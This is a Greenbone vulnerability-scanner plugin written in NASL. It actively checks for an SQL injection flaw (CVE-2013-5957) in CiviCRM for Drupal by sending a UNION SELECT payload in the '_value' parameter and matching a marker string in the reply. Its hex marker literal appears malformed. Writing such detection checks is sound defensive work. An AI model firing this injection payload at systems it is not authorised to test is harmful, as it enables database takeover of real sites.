# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804158");
  script_version("2023-07-27T05:05:08+0000");
  script_cve_id("CVE-2013-5957");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-12-04 19:52:35 +0530 (Wed, 04 Dec 2013)");
  script_name("Drupal Module CiviCRM '_value' Parameter SQL Injection Vulnerability - Active Check");


  script_tag(name:"summary", value:"CiviCRM is prone to an SQL injection (SQLi) vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
is possible to execute sql query.");
  script_tag(name:"solution", value:"Upgrade to CiviCRM version 4.2.12 or 4.3.7 or 4.4.beta4 or later.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"insight", value:"The flaw is due to insufficient validation of '_value' HTTP GET parameter
passed to '/Location.php' script.");
  script_tag(name:"affected", value:"CiviCRM versions 4.2.x before 4.2.12, 4.3.x before 4.3.7, and 4.4.x before
4.4.beta4.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
commands in applications database and gain complete control over the vulnerable
web application.");

  script_xref(name:"URL", value:"http://civicrm.org/advisory/civi-sa-2013-009-sql-injection-vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64007");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_drupal_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("drupal/http/detected");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/?q=civicrm/ajax/jqState&_value=-1%20UNION%20SELECT%201,concat(0x673716C2D696E6A656374696F6E2D74657374)";

if(http_vuln_check(port:port, url:url, pattern:"sql-injection-test", extra_check:"name")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);